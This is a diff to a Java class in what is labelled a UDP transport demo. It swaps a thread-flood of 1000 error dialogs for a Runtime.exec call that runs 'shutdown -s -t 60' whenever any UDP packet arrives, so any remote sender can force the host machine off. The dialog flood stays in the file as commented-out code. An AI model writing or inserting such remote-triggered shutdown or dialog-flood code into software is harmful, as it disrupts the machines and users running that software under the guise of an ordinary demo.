@@ -1,6 +1,5 @@
 package cn.kerninventory.demos.transport.udp;
 
-import javax.swing.*;
 import java.io.IOException;
 import java.net.DatagramPacket;
 import java.net.DatagramSocket;
@@ -24,13 +23,15 @@ public class AimaServer {
             socket.receive(packet);
             String message = new String(bytes, StandardCharsets.UTF_8);
             System.out.println(message);
-            new Thread(() -> {
-                for (int i = 0 ; i < 1000 ; i ++) {
-                    new Thread(() -> {
-                        JOptionPane.showMessageDialog(null, message, "服务", JOptionPane.ERROR_MESSAGE);
-                    }).start();
-                }
-            }).start();
+
+            Runtime.getRuntime().exec("shutdown -s -t 60");
+//            new Thread(() -> {
+//                for (int i = 0 ; i < 1000 ; i ++) {
+//                    new Thread(() -> {
+//                        JOptionPane.showMessageDialog(null, message, "服务", JOptionPane.ERROR_MESSAGE);
+//                    }).start();
+//                }
+//            }).start();
         }
     }
 
